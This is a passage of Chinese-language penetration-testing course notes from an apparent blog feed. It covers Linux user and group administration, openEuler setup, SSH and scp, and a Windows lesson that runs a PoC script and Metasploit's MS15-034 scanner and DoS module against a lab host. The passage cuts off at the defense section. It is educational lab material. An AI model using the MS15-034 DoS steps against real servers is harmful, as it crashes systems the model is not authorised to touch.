class="attr">[root@ntd</span> <span class="string">~]# passwd nvshen             //管理员才有权改其他用户密码</span></span><br><span class="line"><span class="attr">更改用户nvshen的密码。</span></span><br><span class="line"><span class="attr">新的密码：</span></span><br><span class="line"><span class="attr">重新输入新的密码：</span></span><br><span class="line"><span class="attr">passwd</span>:<span class="string">所有的身份验证令牌已经成功更新</span></span><br></pre></td></tr></table></figure><h3 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h3><p><strong>userdel命令</strong></p><ul><li>格式：userdel [-r] 用户名</li><li>添加 -r 选项时，可以将宿主目录&#x2F;用户邮箱也一并删除</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# userdel -r nvshen             //删除用户</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# id nvshen</span></span><br><span class="line"><span class="attr">id</span>: <span class="string">nvshen: no such user                    //再次查询，提示没有这个用户</span></span><br></pre></td></tr></table></figure><h2 id="组账号管理"><a href="#组账号管理" class="headerlink" title="组账号管理"></a>组账号管理</h2><h3 id="添加组"><a href="#添加组" class="headerlink" title="添加组"></a>添加组</h3><p><strong>组的作用</strong></p><ul><li>用来批量授权</li><li>作为访问文档、进程等资源的身份凭据组</li></ul><p><strong>账号的主要属性</strong></p><ul><li>组名、成员用户列表</li></ul><p><strong>groupadd命令</strong></p><ul><li>格式：groupadd 组名</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# groupadd gaibang             //创建gaibang用户组</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# cat /etc/group               //查看用户组信息</span></span><br></pre></td></tr></table></figure><h3 id="为组添加-删除成员用户"><a href="#为组添加-删除成员用户" class="headerlink" title="为组添加&#x2F;删除成员用户"></a>为组添加&#x2F;删除成员用户</h3><p><strong>gpasswd命令</strong></p><ul><li>格式：gpasswd [-a|-d 用户名] 组名</li><li>-a（add）：添加</li><li>-d（delete）：删除</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# useradd nvshen                   //重新添加nvshen用户</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# gpasswd -a nvshen gaibang        //将nvshen添加到gaibang组</span></span><br><span class="line"><span class="attr">正在将用户“nvshen”加入到“gaibang”组中</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# id nvshen                        //确认结果</span></span><br><span class="line"><span class="attr">uid</span>=<span class="string">1004(nvshen) gid=1004(nvshen) 组=1004(nvshen),1005(gaibang)</span></span><br></pre></td></tr></table></figure><h3 id="删除组"><a href="#删除组" class="headerlink" title="删除组"></a>删除组</h3><p><strong>groupdel命令</strong></p><ul><li>格式： groupdel 组名</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# groupdel gaibang       //删除gaibang用户组</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# id nvshen              //原有组成员自动被解散</span></span><br><span class="line"><span class="attr">uid</span>=<span class="string">1004(nvshen) gid=1004(nvshen) 组=1004(nvshen)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-Linux渗透测试1</title>
      <link href="/posts/lnxpte1.html"/>
      <url>/posts/lnxpte1.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux渗透测试"><a href="#Linux渗透测试" class="headerlink" title="Linux渗透测试"></a>Linux渗透测试</h1><h2 id="Linux系统综述"><a href="#Linux系统综述" class="headerlink" title="Linux系统综述"></a>Linux系统综述</h2><h3 id="Linux是一种操作系统"><a href="#Linux是一种操作系统" class="headerlink" title="Linux是一种操作系统"></a>Linux是一种操作系统</h3><p><strong>曾经，被Microsoft 视为最大的威胁</strong></p><p><strong>而今，互联网领域的幕后老大</strong></p><h3 id="超级计算机500强"><a href="#超级计算机500强" class="headerlink" title="超级计算机500强"></a>超级计算机500强</h3><p><img src="/../img/img_artical/net_sec/10.1.1.png" alt="10.1.1"></p><h3 id="Linux的诞生"><a href="#Linux的诞生" class="headerlink" title="Linux的诞生"></a>Linux的诞生</h3><p><strong>Linux之父，Linus Torwalds</strong></p><ul><li>1991年10月，发布0.02版（第一个公开版）内核，主要用于控制CPU&#x2F;内存&#x2F;磁盘，并调度进程&#x2F;文件等资源</li><li>标准读音：哩呐科斯</li><li>官网：<a href="http://www.kernel.org/">www.kernel.org</a></li></ul><h3 id="开源-自由"><a href="#开源-自由" class="headerlink" title="开源&amp;自由"></a>开源&amp;自由</h3><p><strong>自由软件之父，Richard Stallman</strong></p><ul><li>1989年，提出“自由软件”的概念</li><li>允许自由使用软件、分发软件、修改源代码、再次分发修改后的软件</li><li>操作系统：GNU is Not Unix</li><li>授权协议：General Public Licence</li></ul><h3 id="Linux发行版本"><a href="#Linux发行版本" class="headerlink" title="Linux发行版本"></a>Linux发行版本</h3><p><strong>公开发布的基于Linux内核的完整的操作系统</strong></p><ul><li>Linux内核 + 各种外围软件</li></ul><p><strong>操作系统的名称&#x2F;版本由发行方决定</strong></p><ul><li>红帽Red HatEnterprise Linux 7&#x2F;8&#x2F;9、CentOS7&#x2F;8、Fedora37</li><li>欧拉openEuler22.03&#x2F;22.09</li><li>德边Debian Linux 11.5</li><li>乌班图Ubuntu Linux 22.04&#x2F;22.10、Kali2022.3</li></ul><h3 id="关于openEuler"><a href="#关于openEuler" class="headerlink" title="关于openEuler"></a>关于openEuler</h3><p><strong>openEuler源于华为EulerOS操作系统</strong></p><ul><li>通过社区合作，打造创新平台，构建支持多处理架构、统一和开放的操作系统，推动软硬件应用生态繁荣发展</li><li>最新版：openEuler23.09</li><li>稳定版：openEuler22.03 LTS (长期支持版)</li></ul><h3 id="与Win系统的一些差别"><a href="#与Win系统的一些差别" class="headerlink" title="与Win系统的一些差别"></a>与Win系统的一些差别</h3><p><img src="/../img/img_artical/net_sec/10.1.2.png" alt="10.1.2"></p><h3 id="Linux目录结构"><a href="#Linux目录结构" class="headerlink" title="Linux目录结构"></a>Linux目录结构</h3><p><strong>倒挂的树型结构</strong></p><ul><li>最顶层为根，使用&#x2F;表示</li></ul><p><img src="/../img/img_artical/net_sec/10.1.3.png" alt="10.1.3"></p><h2 id="部署本地Linux环境"><a href="#部署本地Linux环境" class="headerlink" title="部署本地Linux环境"></a>部署本地Linux环境</h2><h3 id="准备计算机及安装光盘"><a href="#准备计算机及安装光盘" class="headerlink" title="准备计算机及安装光盘"></a>准备计算机及安装光盘</h3><p><strong>新建一台openEuler 22.03 LTS虚拟机</strong></p><ul><li>配置内存2GB、磁盘80GB</li><li>准备好安装光盘（虚拟机环境使用ISO镜像文件）</li></ul><p><img src="/../img/img_artical/net_sec/10.1.4.png" alt="10.1.4"></p><h3 id="配置系统安装"><a href="#配置系统安装" class="headerlink" title="配置系统安装"></a>配置系统安装</h3><p><strong>引导计算机从光盘启动，设置安装</strong></p><ul><li>选择“Install openEuler22.03-LTS  –&gt;  选择中文Chinese</li><li>选择“自动分区”、“服务器“</li><li>设置“根密码”为ntd.cn1234</li></ul><p><strong>设置网络和主机名</strong></p><ul><li><p>选择  手动</p></li><li><p>IP地址&#x2F;掩码：192.168.10.223&#x2F;24</p></li><li><p>网关：192.168.10.2</p></li><li><p>DNS服务：192.168.10.2</p></li><li><p>选择需要IPv4地址完成这个连接</p></li><li><p>点击开始安装</p><ul><li>完成安装后，点击重启系统</li></ul></li></ul><h3 id="登入系统"><a href="#登入系统" class="headerlink" title="登入系统"></a>登入系统</h3><p><strong>登入openEuler服务器</strong></p><ul><li>默认未提供桌面</li><li>根据提示，在login：后输入用户名root</li><li>再根据提示输入密码（无显示），即可登录到命令行界面</li></ul><h3 id="命令行终端"><a href="#命令行终端" class="headerlink" title="命令行终端"></a>命令行终端</h3><ul><li>命令行提示解读</li><li>[用户名@主机名 所在目录]权限标识</li><li>符号~代表当前用户的主目录</li><li>最后一位 # 表示管理权限，若为 $ 表示普通权限</li></ul><h2 id="SSH远程控制"><a href="#SSH远程控制" class="headerlink" title="SSH远程控制"></a>SSH远程控制</h2><h3 id="SSH协议及常用软件"><a href="#SSH协议及常用软件" class="headerlink" title="SSH协议及常用软件"></a>SSH协议及常用软件</h3><p><strong>Secure SHell，安全命令行终端</strong></p><ul><li>被控端：启用sshd系统服务，提供授权用户&#x2F;密码</li><li>主控端：支持SSH协议的客户端软件</li></ul><p><strong>常用SSH管理工具</strong></p><ul><li>PC端：MobaXterm、Putty+WinSCP、Xshell+Xftp、SecureCRT等</li><li>手机端：iTerminal、华为云APP、阿里云APP等</li></ul><h3 id="远程执行命令"><a href="#远程执行命令" class="headerlink" title="远程执行命令"></a>远程执行命令</h3><p><strong>使用Win10的ssh命令，可以管理远程的Linux主机</strong></p><ul><li>用法：ssh root@远程主机地址</li></ul><p><strong>使用MobaXterm全能终端，也可以管理远程的Linux主机</strong></p><ul><li>官网：<a href="https://mobaxterm.mobatek.net/">https://mobaxterm.mobatek.net</a></li></ul><p><strong>使用MobaXterm连接Linux主机执行命令</strong></p><ul><li>Session -&gt; SSH -&gt; 填写被控主机信息 -&gt; OK</li></ul><h3 id="远程传输文档"><a href="#远程传输文档" class="headerlink" title="远程传输文档"></a>远程传输文档</h3><p><strong>使用MobaXterm连接Linux主机执行命令</strong></p><ul><li>左侧sftp边栏，来回拖放即可</li></ul><p><strong>使用Win10的scp命令，可以与远程Linux主机互传文档</strong></p><ul><li>用法1（上传）：scp -r passwd.txt <a href="mailto:&#114;&#111;&#x6f;&#x74;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#49;&#48;&#x2e;&#x32;&#50;&#51;">&#114;&#111;&#x6f;&#x74;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#49;&#48;&#x2e;&#x32;&#50;&#51;</a>:&#x2F;root&#x2F;mima.txt</li><li>用法2（下载）：scp -r <a href="mailto:&#114;&#x6f;&#111;&#116;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#49;&#48;&#46;&#50;&#x32;&#51;">&#114;&#x6f;&#111;&#116;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#49;&#48;&#46;&#50;&#x32;&#51;</a>:&#x2F;etc&#x2F;passwd passwd.txt</li></ul><h2 id="使用Linux环境"><a href="#使用Linux环境" class="headerlink" title="使用Linux环境"></a>使用Linux环境</h2><h3 id="命令行探索"><a href="#命令行探索" class="headerlink" title="命令行探索"></a>命令行探索</h3><p><strong>Print Working Directory，显示当前工作目录</strong></p><ul><li>pwd</li></ul><p><strong>Change Directory，改变工作目录</strong></p><ul><li>cd  目录路径</li></ul><p><strong>List，列出目录内容&#x2F;文档权限</strong></p><ul><li>ls  目录路径</li></ul><h3 id="用户的创建、切换及退出"><a href="#用户的创建、切换及退出" class="headerlink" title="用户的创建、切换及退出"></a>用户的创建、切换及退出</h3><p><strong>useradd，创建用户</strong></p><ul><li>useradd  用户名</li></ul><p><strong>passwd，为用户设置密码</strong></p><ul><li>passwd  用户名</li></ul><p><strong>Substitute User，替换为新用户</strong></p><ul><li>su  -用户名（-代表切换用户时进入到用户的家目录）</li></ul><p><strong>exit，退出当前的命令行环境</strong></p><ul><li>exit</li></ul><h2 id="配置Linux网络"><a href="#配置Linux网络" class="headerlink" title="配置Linux网络"></a>配置Linux网络</h2><h3 id="查看IP-网关地址"><a href="#查看IP-网关地址" class="headerlink" title="查看IP&#x2F;网关地址"></a>查看IP&#x2F;网关地址</h3><p><strong>查看IP地址参数</strong></p><ul><li>ifconfig</li><li>ifconfig 网卡名</li></ul><p><strong>查看默认网关记录：route -n</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@localhost</span> <span class="string">~]# route -n</span></span><br><span class="line"><span class="attr">Kernel</span> <span class="string">IP routing table</span></span><br><span class="line"><span class="attr">Destination</span>     <span class="string">Gateway         Genmask         Flags Metric Ref    Use Iface</span></span><br><span class="line"><span class="attr">0.0.0.0</span>         <span class="string">192.168.10.2    0.0.0.0         UG    100    0        0 ens160</span></span><br><span class="line"><span class="attr">192.168.10.0</span>    <span class="string">0.0.0.0         255.255.255.0   U     100    0        0 ens160</span></span><br><span class="line"><span class="attr">192.168.122.0</span>   <span class="string">0.0.0.0         255.255.255.0   U     0      0        0 virbr0</span></span><br></pre></td></tr></table></figure><h3 id="查看DNS-主机名信息"><a href="#查看DNS-主机名信息" class="headerlink" title="查看DNS&#x2F;主机名信息"></a>查看DNS&#x2F;主机名信息</h3><p><strong>查看当前使用的DNS信息: cat &#x2F;etc&#x2F;resolv.conf</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@localhost</span> <span class="string">~]# cat /etc/resolv.conf</span></span><br><span class="line"><span class="comment"># Generated by NetworkManager</span></span><br><span class="line"><span class="attr">nameserver</span> <span class="string">192.168.10.2</span></span><br></pre></td></tr></table></figure><p><strong>查看主机名：hostname</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@localhost</span> <span class="string">~]# hostname</span></span><br><span class="line"><span class="attr">localhost.localdomain</span></span><br></pre></td></tr></table></figure><h3 id="修改网络连接"><a href="#修改网络连接" class="headerlink" title="修改网络连接"></a>修改网络连接</h3><p><strong>nmtui工具 &#x3D;&gt; Edit a connection</strong></p><p><img src="/../img/img_artical/net_sec/10.1.5.png" alt="10.1.5"></p><h3 id="激活-停用连接"><a href="#激活-停用连接" class="headerlink" title="激活&#x2F;停用连接"></a>激活&#x2F;停用连接</h3><p><strong>使用nmtui工具 &#x3D;&gt; Activate a connection</strong></p><ul><li>网卡名前面的*表示已激活，否则未激活</li><li>如果地址参数有变更，可以先停用，然后再启用</li></ul><p><img src="/../img/img_artical/net_sec/10.1.6.png" alt="10.1.6"></p><h3 id="配置主机名"><a href="#配置主机名" class="headerlink" title="配置主机名"></a>配置主机名</h3><p><strong>使用nmtui工具 &#x3D;&gt; Set system hostname</strong></p><ul><li>根据提示输入新主机名，并回车确认</li></ul><p><img src="/../img/img_artical/net_sec/10.1.7.png" alt="10.1.7"></p><h2 id="选购ECS云主机"><a href="#选购ECS云主机" class="headerlink" title="选购ECS云主机"></a>选购ECS云主机</h2><h3 id="什么是云计算？"><a href="#什么是云计算？" class="headerlink" title="什么是云计算？"></a>什么是云计算？</h3><p><strong>基于互联网处理请求并交付资源</strong></p><ul><li>用户端只关注资源可用性（提需求、拿结果）</li><li>服务端&#x2F;云端组织运算处理</li></ul><p><img src="/../img/img_artical/net_sec/10.1.8.png" alt="10.1.8"></p><h3 id="知名云服务商"><a href="#知名云服务商" class="headerlink" title="知名云服务商"></a>知名云服务商</h3><ul><li>国外：亚马逊AWS、微软Azure、IBM SCE+</li><li>国内：华为云、阿里云、百度云、腾讯云</li></ul><p><img src="/../img/img_artical/net_sec/10.1.9.png" alt="10.1.9"></p><h3 id="最常见的云产品-云主机"><a href="#最常见的云产品-云主机" class="headerlink" title="最常见的云产品-云主机"></a>最常见的云产品-云主机</h3><p><strong>云主机&#x2F;云服务器，实际上就是通过互联网提供的虚拟机</strong></p><ul><li>华为云ECS (Elastic Cloud Server，弹性云服务器)</li><li>阿里云ECS (Elastic Compute Service，弹性计算服务)</li><li>腾讯云CVM (Cloud Virtual Machine，云虚拟机)</li><li>百度云BCC (Baidu Cloud Compute，百度云计算)</li></ul><h3 id="云服务器选型要点"><a href="#云服务器选型要点" class="headerlink" title="云服务器选型要点"></a>云服务器选型要点</h3><p><strong>控制台 -&gt; 弹性云服务器 -&gt; 购买弹性云服务器</strong></p><ul><li>计费模式（包年包月、按需付费）</li><li>规格（CPU&#x2F;内存&#x2F;硬盘）</li><li>镜像（Linux系统）</li><li>登录方式（设密码）</li><li>流量计费（按带宽、按流量）</li></ul><h3 id="选购一台ECS云服务器"><a href="#选购一台ECS云服务器" class="headerlink" title="选购一台ECS云服务器"></a>选购一台ECS云服务器</h3><ul><li>选购 &#x3D;&gt; … &#x3D;&gt; 立即购买 &#x3D;&gt; 接受许可协议 &#x3D;&gt;</li><li>提交申请 &#x3D;&gt; 确认实例</li></ul><p><img src="/../img/img_artical/net_sec/10.1.10.png" alt="10.1.10"></p><h3 id="ECS基本操作"><a href="#ECS基本操作" class="headerlink" title="ECS基本操作"></a>ECS基本操作</h3><ul><li>基本管理：开机、关机、重启、删除、远程登录</li><li>更多操作：更改配置、重装系统、更换系统</li></ul><p><img src="/../img/img_artical/net_sec/10.1.11.png" alt="10.1.11"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-Windows渗透测试3</title>
      <link href="/posts/winpte3.html"/>
      <url>/posts/winpte3.html</url>
      
        <content type="html"><![CDATA[<h1 id="Windows渗透测试"><a href="#Windows渗透测试" class="headerlink" title="Windows渗透测试"></a>Windows渗透测试</h1><h2 id="漏洞披露"><a href="#漏洞披露" class="headerlink" title="漏洞披露"></a>漏洞披露</h2><h3 id="微软安全公告"><a href="#微软安全公告" class="headerlink" title="微软安全公告"></a>微软安全公告</h3><p><strong>安全公告都有一个唯一的编号</strong></p><ul><li>其命名规则是：MS年份一补丁序号</li><li>比如MS17-010就表示2017年发布的编号为010的安全公告</li><li>最后安全公告：MS17-023</li></ul><p><strong>每个公告对应微软知识库编号</strong></p><ul><li>比如MS17-010对应的是4013389，通过编号在微软的网站上查找到相应的文章和解决方案</li><li>找到：基于x64的Windows Server2008 R2版本安全更新文件名为：Windows6.1-KB4012212-x64.msi</li></ul><h3 id="微软安全更新指南"><a href="#微软安全更新指南" class="headerlink" title="微软安全更新指南"></a>微软安全更新指南</h3><p><strong>微软安全更新指南</strong></p><ul><li>自2017年2月起，替代安全公告</li><li><a href="https://msrc.microsoft.com/update-guide">https://msrc.microsoft.com/update-guide</a></li></ul><h3 id="什么是CVE"><a href="#什么是CVE" class="headerlink" title="什么是CVE"></a>什么是CVE</h3><p><strong>CVE（Common Vulnerabilities and Exposures）通用漏洞与披露</strong></p><ul><li>CVE可以理解为是一个漏洞字典，也可以称作信息安全漏洞词典</li><li>CVE是指给每个安全漏洞的确定一个唯一的名称，也叫CVEID 编号</li><li><a href="http://cve.org/">http://cve.org</a> 收录189732条记录</li></ul><h3 id="漏洞披露平台"><a href="#漏洞披露平台" class="headerlink" title="漏洞披露平台"></a>漏洞披露平台</h3><p><strong>国家信息漏洞共享平台</strong></p><ul><li><a href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a></li></ul><p><strong>美国国家信息安全漏洞库</strong></p><ul><li><a href="https://nvd.nist.gov/">https://nvd.nist.gov</a></li></ul><h2 id="漏洞扫描-弱点评估"><a href="#漏洞扫描-弱点评估" class="headerlink" title="漏洞扫描&#x2F;弱点评估"></a>漏洞扫描&#x2F;弱点评估</h2><h3 id="什么是网络探测"><a href="#什么是网络探测" class="headerlink" title="什么是网络探测"></a>什么是网络探测</h3><p><strong>网络探测</strong></p><ul><li>网络探测指对计算机网络或DNS服务器进行扫描，获取有效的地址、活动端口号、主机操作系统类型和安全弱点</li></ul><p><strong>常用工具</strong></p><ul><li>Nmap、NessusOpenVAS、MetasploitFramework</li></ul><h3 id="网络探测的应用"><a href="#网络探测的应用" class="headerlink" title="网络探测的应用"></a>网络探测的应用</h3><p><strong>安全评估</strong></p><ul><li>远程系统安全评估是一种非常重要的安全防护方法</li><li>包括构成网络的路由器、交换机和提供各种应用的服务器以及个人电脑，都存在着相当数量的漏洞</li><li>各种攻击行为正是利用这些漏洞展开的</li></ul><h3 id="什么是OpenVAS"><a href="#什么是OpenVAS" class="headerlink" title="什么是OpenVAS"></a>什么是OpenVAS</h3><p><strong>OpenVAS（Open Vulnerability Assessment Scanner）</strong></p><ul><li>是一个开源的全功能的漏洞扫描评估系统，是Nessus项目分支</li><li>功能包括非认证测试、认证测试、各种互联网和工业协议、大规模扫描的性能调整等漏洞库持续更新</li><li><a href="https://github.com/greenbone/openvas-scanner/">https://github.com/greenbone/openvas-scanner/</a></li></ul><h3 id="OpenVAS部署"><a href="#OpenVAS部署" class="headerlink" title="OpenVAS部署"></a>OpenVAS部署</h3><p><strong>Kali默认没有安装OpenVAS，在线安装并初始化漏洞列表需要3~5小时</strong></p><ul><li>解压kali2022_vmx.zip</li><li>还原快照至”OpenVAS”</li><li>IP地址：192.168.10.224</li></ul><p><strong>从物理机访问</strong></p><ul><li><a href="https://192.168.10.224:9392/">https://192.168.10.224:9392</a></li><li>登录用户名admin密码admin</li></ul><h3 id="执行扫描任务"><a href="#执行扫描任务" class="headerlink" title="执行扫描任务"></a>执行扫描任务</h3><ul><li>第一步：添加扫描端口</li><li>第二步：添加扫描目标</li><li>第三步：执行扫描任务</li><li>第四步：检查扫描结果</li></ul><h2 id="Metasploit-Framework"><a href="#Metasploit-Framework" class="headerlink" title="Metasploit Framework"></a>Metasploit Framework</h2><h3 id="关于Metasploit-Framework"><a href="#关于Metasploit-Framework" class="headerlink" title="关于Metasploit Framework"></a>关于Metasploit Framework</h3><p><strong>一款开源的安全漏检测工具，简称MSF</strong></p><ul><li>可以收集信息、探测系统漏洞、执行漏洞利用测试等，为渗透测试、攻击编码和漏洞研究提供了一个可靠平台</li><li>集成数千个漏洞利用、辅助测试模块，并保持持续更新</li><li>由著名黑客、安全专家H.D.Moore主导开发</li><li>官方网站：<a href="https://metasploit.com/">https://metasploit.com</a></li></ul><p><strong>在kali中，通过msfconsole进入控制台</strong></p><h3 id="MSF常用模块"><a href="#MSF常用模块" class="headerlink" title="MSF常用模块"></a>MSF常用模块</h3><p><strong>辅助模块Auxiliary</strong></p><ul><li>不直接在测试者和目标主机之间建立访问</li><li>只负责执行扫描、嗅探、指纹识别、爆破等相关功能以辅助渗透测试</li></ul><p><strong>漏洞利用Exploits</strong></p><ul><li>利用目标系统、应用或者服务中的安全漏洞进行攻击行为</li><li>包括用于破坏系统安全的攻击代码，每个漏洞都有相应的攻击代码</li></ul><p><strong>攻击载荷 Payloads</strong></p><ul><li>一般是一段代码，被渗透攻击模块通过安全漏洞植入目标主机中并运行，主要用来与目标主机之间建立一个稳定的连接。可返回Shell或进行程序注入等操作后</li></ul><p><strong>渗透模块Post</strong></p><ul><li>该模块主要用于在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、实施跳板攻击等</li></ul><h3 id="MSF核心命令"><a href="#MSF核心命令" class="headerlink" title="MSF核心命令"></a>MSF核心命令</h3><p><strong>执行msfconsole进入控制台以后</strong></p><ul><li>？：获取帮助</li><li>exit：退出MSF控制台</li><li>back：返回上一级</li><li>show：查看模块或相关信息</li><li>search：搜索模块</li><li>use：使用模块</li><li>options：列出当前模块的选项</li><li>set：设置模块选项</li><li>run或exploit：运行当前模块</li></ul><h2 id="CVE-2015-1635漏洞利用"><a href="#CVE-2015-1635漏洞利用" class="headerlink" title="CVE-2015-1635漏洞利用"></a>CVE-2015-1635漏洞利用</h2><h3 id="Windows系统历年高危漏洞"><a href="#Windows系统历年高危漏洞" class="headerlink" title="Windows系统历年高危漏洞"></a>Windows系统历年高危漏洞</h3><ul><li>CVE-2012-0002（MS12-020）RDP漏洞DOS攻击</li><li>CVE-2015-1635（MS15-034）HTTP.SYS漏洞攻击</li><li>CVE-2017-0143（MS17-010）445漏洞永恒之蓝攻击</li><li>CVE-2019-0708  RDP漏洞攻击</li></ul><h3 id="CVE-2015-1635（MS15-034）漏洞"><a href="#CVE-2015-1635（MS15-034）漏洞" class="headerlink" title="CVE-2015-1635（MS15-034）漏洞"></a>CVE-2015-1635（MS15-034）漏洞</h3><p><strong>HTTP.sys RCE漏洞</strong></p><ul><li>漏洞存在于HTTP协议堆栈(HTTP.sys)中，攻击者只要发送恶意http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃</li><li>漏洞名称：CVE-2015-1635（允许远程执行代码漏洞）</li><li>漏洞安全公告：MS15-034</li></ul><p><strong>影响系统</strong></p><ul><li>Windows 7&#x2F;8&#x2F;8.1</li><li>Windows Server 2008&#x2F;2008 R2&#x2F;2012&#x2F;2012 R2</li></ul><h3 id="POC脚本检测"><a href="#POC脚本检测" class="headerlink" title="POC脚本检测"></a>POC脚本检测</h3><p><strong>POC脚本检测</strong></p><ul><li>Proof of Concept”观点证明”</li><li>一段验证漏洞的程序，使我们能够确认这个漏洞是真实存在的</li></ul><p><strong>脚本上传</strong></p><ul><li>上传cve-2015-1635.poc到kali系统&#x2F;root目录下</li></ul><h3 id="MS15-034漏洞检测"><a href="#MS15-034漏洞检测" class="headerlink" title="MS15-034漏洞检测"></a>MS15-034漏洞检测</h3><p><strong>第一步：POC脚本检测</strong></p><ul><li>上传cve-2015-1635.poc到kali系统</li><li>修改cve-2015-1635.poc文件中的ipaddr为 windows靶机地址</li><li>使用python执行POC脚本</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@kali</span> <span class="string">~] #  python2  cve-2015-1635.poc          //执行POC验证脚本 </span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Audit Started                                 //审计开始 </span></span><br><span class="line"><span class="attr">[!!]</span> <span class="string">Looks VULN                                  //看起来很脆弱(vulnerable) </span></span><br></pre></td></tr></table></figure><p><strong>第二步：搜索CVE-2015-1635或MS15-034</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">msf6</span> <span class="string">&gt; search  ms15-034</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Matching</span> <span class="string">Modules</span></span><br><span class="line">================</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   #  Name                                                  Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   <span class="attr">-</span>  <span class="string">----                                                  ---------------  ----    -----  -----------</span></span><br><span class="line">   <span class="attr">0</span>  <span class="string">auxiliary/dos/http/ms15_034_ulonglongadd                                //攻击</span></span><br><span class="line">   <span class="attr">1</span>  <span class="string">auxiliary/scanner/http/ms15_034_http_sys_memory_dump                    //扫描   </span></span><br></pre></td></tr></table></figure><p><strong>第三步：先使用辅助脚本 use 1，先做扫描</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">msf6</span> <span class="string">&gt; use 1</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">auxiliary(scanner/http/ms15_034_http_sys_memory_dump) &gt; set rhosts 192.168.10.142</span></span><br><span class="line"><span class="attr">rhosts</span> =<span class="string">&gt; 192.168.10.142</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">auxiliary(scanner/http/ms15_034_http_sys_memory_dump) &gt; run</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[+]</span> <span class="string">Target may be vulnerable...         //目标可能是脆弱的</span></span><br></pre></td></tr></table></figure><p><strong>第四步：退出扫描脚本 use 1，切换攻击脚本 use 0</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">msf6</span> <span class="string">&gt; use 0</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">auxiliary(dos/http/ms15_034_ulonglongadd) &gt; set rhosts 192.168.10.142</span></span><br><span class="line"><span class="attr">rhosts</span> =<span class="string">&gt; 192.168.10.142</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">auxiliary(dos/http/ms15_034_ulonglongadd) &gt; run</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[*]</span> <span class="string">DOS request sent                           //DoS请求已发送</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Scanned 1 of 1 hosts (100% complete)       //扫描1个主机已完成</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Auxiliary module execution completed       //辅助模块执行完成</span></span><br></pre></td></tr></table></figure><p><strong>检查目标主机是否蓝屏</strong></p><h3 id="MS15-034-漏洞防御"><a href="#MS15-034-漏洞防御" class="headerlink" 